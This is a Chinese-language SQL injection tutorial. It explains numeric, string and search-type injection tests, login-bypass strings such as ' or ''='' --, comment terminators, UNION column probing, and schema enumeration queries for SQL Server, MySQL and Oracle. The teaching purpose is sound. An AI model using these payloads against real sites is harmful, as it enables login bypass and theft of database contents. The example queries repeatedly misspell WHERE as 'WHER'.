# SQL注入漏洞产生的原因

## SQL注入(SQL Injection):
是程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患.用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据或进行数据库操作.

## SQL注入攻击流程
```
一般可以分为这么几个步骤：
1. 判断注入点
2. 判断注入点类型
3. 判断数据库类型
4. 获取数据库数据库，提权
```
## 注入点可能在哪里？
```
所有的输入只要和数据库进行交互的，都有可能触发SQL注入,常见的包括:
Get参数触发SQL注入
POST参数触发SQL注入
Cookie触发SQL注入
没错，Cookie也是可以的
参与SQL执行的输入都有可能进行SQL注入
```

## 常见网站架构
```
我们可以通过常见构架来判断数据库的类型
asp + access
asp + mssql
asp.net + mssql
php + mysql
Jsp + oracle
Jsp + mysql

如果你发现了一个网站是用php的，那这个网站的数据库很有可能就是MySQL
当然我们也可以在单引号报错里面知道是什么数据库
```

## 数字型注入点
```
测试方法： 
http://host/test.php?id=100 and 1=1 返回成功 
http://host/test.php?id=100 and 1=2 返回失败 

为什么第一个会返回成功，而第二个是返回失败呢？原因如下：
假设我们网站的SQL查询的语句是这样的: SELECT * FROM news WHERE id=$id

这里的$id是用户提交的,当我们输入的是: 100 and 1=1
语句就变成了这样: SELECT * FROM news WHERE id=100 and 1=1

这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了,而在and右边，1=1也是恒成立的，所以整个语句返回的是成功.
当然，如果后面改成了1=2的话，因为1=2是不成立的，and语句的判断逻辑是只要有一个不成立，就返回失败，所以1=2最后会返回的是失败
```
## 字符型注入点
```
测试方法：
http://host/test.php?name=man' and '1'='1 返回成功 
http://host/test.php?name=man' and '1'='2 返回失败 

这里看上去就和上面的数字型就多了个单引号，其实不仅仅如此,原因如下：
还是假设我们网站的SQL语句是这样的: SELECT * FROM news WHERE name='$name'

当我们构造输入为下面这个的时候: man' and '1'='1
语句就变成了: SELECT * FROM news WHERE name='man' and '1'='1'

发现什么了没？这个SQL已经闭合了,还是一样的，这里and的左边是一定成立的，而and右边也是一样的成立，所以and逻辑之后，整个语句返回成功
同理可知如果后面是1'='2就会返回失败，当然，这里不一定非要是1或者2，因为是字符型，所以我们可以输入任何字符

比如这样:
http://host/test.php?name=man' and 'a'='a 返回成功 
http://host/test.php?name=man' and 'a'='b 返回失败 
```
## 搜索型注入点
```
测试方法
http://host//test.php?keyword=python%' and 1=1 and '%'=' 
http://host//test.php?keyword=python%' and 1=2 and '%'='

假设我们的SQL查询语句是这样的: SELECT * FROM news WHERE keyword like '%$keyword%'

这里的$keyword是用户的输入,当我们输入以下语句的时候: python%' and 1=1 and '%'='

最终我们得到的语句是这样的: SELECT * FROM news WHERE keyword like '%python%' and 1=1 and '%'='%'

发现了什么没有？这个语句又一次的闭合了
这里我们再分析以下，因为是and逻辑，只要有一个错误，就返回错误

我们可以把这个语句分为三段:
SELECT * FROM news WHERE keyword like '%python%'
and 1=1
and '%'='%'

第一行的语句肯定是成功（再强调一遍，我们要在存在的查询上构造SQL注入）
第二句也是，第三句也是，因为自己肯定等于自己啊
但是如果我们把第二句换成1=2，那么这个语句肯定就会返回失败了，就是这个原理
```
## 内联式SQL注入
```
内联注入是指查询注入SQL代码后，原来的查询仍然全部执行
假设我们的网站SQL查询语句是这样的: SELECT * FROM admin WHER username='$name' AND password ='$passwd'

这一看就是个登录页面的代码,假如我们构造如下语句提交到登录框中的username
' or ''='
或者提交到password框里面，这两种提交方法是不一样的，我们下面就来分析一下这两个提交方法

提交到username我们的语句就会成为这样: SELECT * FROM admin WHER username='' or ''='' AND password =''

而提交到password则会是这样的: SELECT * FROM admin WHER username='' AND password ='' or ''=''

这里我们要知道一点，就是在SQL语句中，AND的优先级是大于OR的，于是会先计算AND，然后之后才会计算OR，所以这里我们的语句会被OR分为两段SQL语句

这是username框的:
SELECT * FROM admin WHER username=''
or
''='' AND password =''

或者password框的是这样:
SELECT * FROM admin WHER username='' AND password =''
or
''=''

我们首先用第一个来分析,首先计算AND之后:
SELECT * FROM admin WHER username=''  返回失败
or
''='' AND password ='' 返回失败
数据库是不会存在username为NULL的字段的，所以第一句返回的是失败，第三句中，因为password是我们随便输入的，99.99%是不会存在这个密码的，于是AND之后，我们的第三句也是失败的，所以整个语句返回失败的

但是我们的password情况就不一样了
SELECT * FROM admin WHER username='' AND password =''
or
''=''
这里我们第一句是返回失败的，但是我们的第二句''=''是返回成功的，OR逻辑是有一个是成功就返回成功，于是我们的整个语句就会返回成功

返回成功之后我们就会绕过登录表单直接登录系统了
```

## 终止式SQL注入
```
终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句
于是被注释的查询不会被执行，我们还是拿上面那个例子举例
我们上面已经知道，在username框内填入: ' or ''='
程序是不会返回成功的，我们就没有办法在username做文章了吗？错了，我们还有终止式

还是上面那个SQL查询语句: SELECT * FROM admin WHER username='$name' AND password ='$passwd'

这里我们构造如下username输入: ' or ''='' --

之后我们就可以得到如下的查询语句: SELECT * FROM admin WHER username='' or ''='' --' AND password ='fuzz'
这里的fuzz是我们随便输入的，--是注释符

这样，我们的语句就可以分为三个部分了
SELECT * FROM admin WHER username=''
or ''='' 返回成功
--' AND password ='fuzz'

第一句肯定是返回失败的，但是我们第二句会返回成功，那你可能会问，那后面的语句了？
已经被我们注释掉了，是不会执行的，所以我们还是可以通过在username做这个手脚来绕过登录

下面是我们常见的一些终止方式

终止字符串：  -- ， #， %23， %00， /* 


终止方法：   -- , ‘-- , ‘)-- , ) -- , ‘)) --, ))--
```
## UNION注入
```
UNION是数据库管理员经常使用且可以掌控的运算符之一,可以使用它连接两条或多条SELECT语句的查询结果

其基本语法如下：
SELECT colum1,colum2,colum3,…,columN FROM table1
UNION
SELECT colum1,colum2,colum3,…,columN FROM table2

如果应用返回第一个（原始）查询得到的数据，那么通过在第一个查询后注入一个UNION运算符，并添加另一个任意查询，便可读取到数据库用户有权限访问的任何一张表,当然这么好用的语句是有限制的 

使用UNION获取数据规则：
两个查询返回的列数必须相同
两个SELECT语句返回的数据库对应的列必须类型相同或兼容
通常只有终止式注入时，可较快猜解并利用，否则要知道原始的SQL语句才能比较方便的利用

UNION语句的构建,确定列数量：
UNION SELECT null,null,null,…,null FROM dual

使用逐步增加null数量，直到匹配原语句的列数量，成功匹配后返回正常页面
这是利用了<两个查询返回的列数必须相同>这个原理
使用ORDER BY确定原语句列数量， 可使用折半查找法提高猜测效率
当我们确定了表中列的数量之后，怎么确定类型?

确定列类型：
UNION SELECT 1,’2’,null,…,null FROM dual

我们这里先猜测第一列为数字，如果返回结果不正确，则判断为字符
如果还是不正确则保持null不变（可能为二进制类型），之后依次完成部分或全部类型的判断

当然，每种方式都有不适用的情况,Union不适用的地方:
注入语句无法截断，且不清楚完整的SQL查询语句
Web页面中有两个SQL查询语句，查询语句的列数不同
```

## 枚举数据库
```
SQL Server

获取当前用户名
id=12 UNION SELECT null, null, user, null FROM master..sysdatabases

获取数据库列表
id=12 UNION SELECT null, null, name,null FROM master..sysdatabases

获取当前数据库名
id =12 UNION SELECT null,null,db_name(),null FROM master..sysdatabases

获取表名
id=12 UNION SELECT null,null,name,null FROM sysobjects where xtype=‘u’

获取字段名
id =12 UNION SELECT null,null,col_name(object_id(‘table_name’), 1), null FROM sysobjects
```
## MySQL
```
获取当前用户: SELECT user()

获取数据库列表: SELECT schema_name FROM information_schema.schemata

获取当前数据库: SELECT database()

获取表名: SELECT table_name FROM information_schema.tables WHERE table_schema='some_db'

获取字段名: SELECT  some_columns  FROM information_schema.columns WHERE table_name='some_name'  
```

## Oracle
```
Oracle只能访问一个数据库，所以无法枚举数据库

获取当前用户表名: SELECT table_name FROM user_tables

获取所有表名及拥有者: SELECT owner, table_name FROM all_tables

获取字段名: SELECT column_name FROM user_tab_columns WHERE table_name='table'
```